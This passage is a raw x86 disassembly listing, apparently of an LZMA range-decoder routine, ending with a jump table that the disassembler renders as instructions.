  407243:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  407246:	d3 e3                	shl    %cl,%ebx
  407248:	8b cb                	mov    %ebx,%ecx
  40724a:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  40724d:	0b d9                	or     %ecx,%ebx
  40724f:	66 8b c8             	mov    %ax,%cx
  407252:	66 c1 e9 05          	shr    $0x5,%cx
  407256:	2b c1                	sub    %ecx,%eax
  407258:	47                   	inc    %edi
  407259:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40725c:	66 89 06             	mov    %ax,(%esi)
  40725f:	89 7d b0             	mov    %edi,-0x50(%ebp)
  407262:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407269:	73 88                	jae    0x4071f3
  40726b:	e9 5e ff ff ff       	jmp    0x4071ce
  407270:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  407273:	ff 45 d4             	incl   -0x2c(%ebp)
  407276:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407279:	85 c0                	test   %eax,%eax
  40727b:	0f 84 84 02 00 00    	je     0x407505
  407281:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  407284:	0f 87 b8 02 00 00    	ja     0x407542
  40728a:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  40728e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407291:	01 45 a0             	add    %eax,-0x60(%ebp)
  407294:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  407298:	0f 84 6d 02 00 00    	je     0x40750b
  40729e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4072a1:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  4072a4:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  4072a7:	72 03                	jb     0x4072ac
  4072a9:	03 45 8c             	add    -0x74(%ebp),%eax
  4072ac:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4072af:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  4072b2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4072b5:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  4072b8:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  4072bb:	40                   	inc    %eax
  4072bc:	33 d2                	xor    %edx,%edx
  4072be:	f7 75 8c             	divl   -0x74(%ebp)
  4072c1:	8b 45 98             	mov    -0x68(%ebp),%eax
  4072c4:	ff 45 98             	incl   -0x68(%ebp)
  4072c7:	ff 4d 9c             	decl   -0x64(%ebp)
  4072ca:	ff 4d d0             	decl   -0x30(%ebp)
  4072cd:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  4072d1:	88 08                	mov    %cl,(%eax)
  4072d3:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4072d6:	7f bc                	jg     0x407294
  4072d8:	e9 78 fd ff ff       	jmp    0x407055
  4072dd:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4072e1:	75 20                	jne    0x407303
  4072e3:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  4072e6:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  4072ea:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4072ed:	c1 e0 04             	shl    $0x4,%eax
  4072f0:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  4072f4:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4072f7:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  4072fe:	e9 ce 00 00 00       	jmp    0x4073d1
  407303:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407306:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  40730d:	00 00 00 
  407310:	8d 70 02             	lea    0x2(%eax),%esi
  407313:	89 75 ac             	mov    %esi,-0x54(%ebp)
  407316:	66 8b 06             	mov    (%esi),%ax
  407319:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40731c:	0f b7 d0             	movzwl %ax,%edx
  40731f:	c1 e9 0b             	shr    $0xb,%ecx
  407322:	0f af ca             	imul   %edx,%ecx
  407325:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  407328:	73 18                	jae    0x407342
  40732a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40732d:	b9 00 08 00 00       	mov    $0x800,%ecx
  407332:	2b ca                	sub    %edx,%ecx
  407334:	c1 f9 05             	sar    $0x5,%ecx
  407337:	03 c8                	add    %eax,%ecx
  407339:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  40733d:	66 89 0e             	mov    %cx,(%esi)
  407340:	eb 19                	jmp    0x40735b
  407342:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  407345:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  407348:	66 8b c8             	mov    %ax,%cx
  40734b:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  407352:	66 c1 e9 05          	shr    $0x5,%cx
  407356:	2b c1                	sub    %ecx,%eax
  407358:	66 89 06             	mov    %ax,(%esi)
  40735b:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407362:	73 25                	jae    0x407389
  407364:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  407368:	0f 84 a9 01 00 00    	je     0x407517
  40736e:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  407371:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407374:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  407378:	0f b6 09             	movzbl (%ecx),%ecx
  40737b:	ff 4d 94             	decl   -0x6c(%ebp)
  40737e:	c1 e0 08             	shl    $0x8,%eax
  407381:	0b c1                	or     %ecx,%eax
  407383:	ff 45 90             	incl   -0x70(%ebp)
  407386:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407389:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  40738f:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  407395:	e9 91 f7 ff ff       	jmp    0x406b2b
  40739a:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  40739e:	75 1c                	jne    0x4073bc
  4073a0:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  4073a3:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4073a6:	c1 e0 04             	shl    $0x4,%eax
  4073a9:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  4073b0:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  4073b7:	e9 38 ff ff ff       	jmp    0x4072f4
  4073bc:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  4073c3:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  4073ca:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  4073d1:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  4073d8:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4073db:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  4073e2:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4073e5:	eb 28                	jmp    0x40740f
  4073e7:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4073eb:	0f 84 32 01 00 00    	je     0x407523
  4073f1:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4073f4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4073f7:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4073fb:	0f b6 09             	movzbl (%ecx),%ecx
  4073fe:	ff 4d 94             	decl   -0x6c(%ebp)
  407401:	c1 e0 08             	shl    $0x8,%eax
  407404:	0b c1                	or     %ecx,%eax
  407406:	ff 45 90             	incl   -0x70(%ebp)
  407409:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40740c:	ff 4d b8             	decl   -0x48(%ebp)
  40740f:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  407413:	7e 5e                	jle    0x407473
  407415:	8b 45 b0             	mov    -0x50(%ebp),%eax
  407418:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40741b:	c1 e9 0b             	shr    $0xb,%ecx
  40741e:	8d 14 00             	lea    (%eax,%eax,1),%edx
  407421:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407424:	8d 34 02             	lea    (%edx,%eax,1),%esi
  407427:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40742a:	66 8b 06             	mov    (%esi),%ax
  40742d:	0f b7 f8             	movzwl %ax,%edi
  407430:	0f af cf             	imul   %edi,%ecx
  407433:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  407436:	73 17                	jae    0x40744f
  407438:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40743b:	b9 00 08 00 00       	mov    $0x800,%ecx
  407440:	2b cf                	sub    %edi,%ecx
  407442:	c1 f9 05             	sar    $0x5,%ecx
  407445:	03 c8                	add    %eax,%ecx
  407447:	d1 65 b0             	shll   $1,-0x50(%ebp)
  40744a:	66 89 0e             	mov    %cx,(%esi)
  40744d:	eb 16                	jmp    0x407465
  40744f:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  407452:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  407455:	66 8b c8             	mov    %ax,%cx
  407458:	66 c1 e9 05          	shr    $0x5,%cx
  40745c:	2b c1                	sub    %ecx,%eax
  40745e:	42                   	inc    %edx
  40745f:	66 89 06             	mov    %ax,(%esi)
  407462:	89 55 b0             	mov    %edx,-0x50(%ebp)
  407465:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40746c:	73 9e                	jae    0x40740c
  40746e:	e9 74 ff ff ff       	jmp    0x4073e7
  407473:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  407476:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  407479:	33 c0                	xor    %eax,%eax
  40747b:	40                   	inc    %eax
  40747c:	d3 e0                	shl    %cl,%eax
  40747e:	2b d8                	sub    %eax,%ebx
  407480:	8b 45 84             	mov    -0x7c(%ebp),%eax
  407483:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407486:	e9 04 ff ff ff       	jmp    0x40738f
  40748b:	01 5d d0             	add    %ebx,-0x30(%ebp)
  40748e:	8b 45 80             	mov    -0x80(%ebp),%eax
  407491:	e9 f9 fe ff ff       	jmp    0x40738f
  407496:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  40749d:	00 00 00 
  4074a0:	e9 88 00 00 00       	jmp    0x40752d
  4074a5:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  4074ac:	00 00 00 
  4074af:	eb 7c                	jmp    0x40752d
  4074b1:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  4074b8:	00 00 00 
  4074bb:	eb 70                	jmp    0x40752d
  4074bd:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  4074c4:	00 00 00 
  4074c7:	eb 64                	jmp    0x40752d
  4074c9:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  4074d0:	00 00 00 
  4074d3:	eb 58                	jmp    0x40752d
  4074d5:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  4074dc:	00 00 00 
  4074df:	eb 4c                	jmp    0x40752d
  4074e1:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  4074e8:	00 00 00 
  4074eb:	eb 40                	jmp    0x40752d
  4074ed:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  4074f4:	00 00 00 
  4074f7:	eb 34                	jmp    0x40752d
  4074f9:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  407500:	00 00 00 
  407503:	eb 28                	jmp    0x40752d
  407505:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  407509:	eb 22                	jmp    0x40752d
  40750b:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  407512:	00 00 00 
  407515:	eb 16                	jmp    0x40752d
  407517:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  40751e:	00 00 00 
  407521:	eb 0a                	jmp    0x40752d
  407523:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  40752a:	00 00 00 
  40752d:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  407533:	6a 22                	push   $0x22
  407535:	59                   	pop    %ecx
  407536:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  40753c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40753e:	33 c0                	xor    %eax,%eax
  407540:	eb 03                	jmp    0x407545
  407542:	83 c8 ff             	or     $0xffffffff,%eax
  407545:	5f                   	pop    %edi
  407546:	5e                   	pop    %esi
  407547:	5b                   	pop    %ebx
  407548:	c9                   	leave
  407549:	c3                   	ret
  40754a:	41                   	inc    %ecx
  40754b:	6b 40 00 e6          	imul   $0xffffffe6,0x0(%eax),%eax
  40754f:	6b 40 00 81          	imul   $0xffffff81,0x0(%eax),%eax
  407553:	6c                   	insb   (%dx),%es:(%edi)
  407554:	40                   	inc    %eax
  407555:	00 56 6c             	add    %dl,0x6c(%esi)
  407558:	40                   	inc    %eax
  407559:	00 16                	add    %dl,(%esi)
  40755b:	73 40                	jae    0x40759d
  40755d:	00 64 73 40          	add    %ah,0x40(%ebx,%esi,2)
  407561:	00 a7 6c 40 00 46    	add    %ah,0x4600406c(%edi)
  407567:	6f                   	outsl  %ds:(%esi),(%dx)
  407568:	40                   	inc    %eax
  407569:	00 b0 6f 40 00 f3    	add    %dh,-0xcffbf91(%eax)
  40756f:	6f                   	outsl  %ds:(%esi),(%dx)
  407570:	40                   	inc    %eax
  407571:	00 64 70 40          	add    %ah,0x40(%eax,%esi,2)
  407575:	00 8b 70 40 00 4b    	add    %cl,0x4b004070(%ebx)
  40757b:	71 40                	jno    0x4075bd
  40757d:	00 40 6d             	add    %al,0x6d(%eax)
  407580:	40                   	inc    %eax
  407581:	00 f9                	add    %bh,%cl
  407583:	6d                   	insl   (%dx),%es:(%edi)
  407584:	40                   	inc    %eax
  407585:	00 bd 6e 40 00 ce    	add    %bh,-0x31ffbf92(%ebp)
  40758b:	71 40                	jno    0x4075cd
  40758d:	00 9e 6f 40 00 dd    	add    %bl,-0x22ffbf91(%esi)
  407593:	72 40                	jb     0x4075d5
  407595:	00 9a 73 40 00 8b    	add    %bl,-0x74ffbf8d(%edx)
  40759b:	74 40                	je     0x4075dd
  40759d:	00 c5                	add    %al,%ch
  40759f:	70 40                	jo     0x4075e1
  4075a1:	00 dc                	add    %bl,%ah
  4075a3:	70 40                	jo     0x4075e5
  4075a5:	00 d8                	add    %bl,%al
  4075a7:	73 40                	jae    0x4075e9
  4075a9:	00 e7                	add    %ah,%bh
  4075ab:	73 40                	jae    0x4075ed
  4075ad:	00 0a                	add    %cl,(%edx)
  4075af:	71 40                	jno    0x4075f1
  4075b1:	00 8c 6e 40 00 17 70 	add    %cl,0x70170040(%esi,%ebp,2)
  4075b8:	40                   	inc    %eax
  4075b9:	00                   	.byte 0
  4075ba:	94                   	xchg   %eax,%esp
  4075bb:	72 40                	jb     0x4075fd
	...
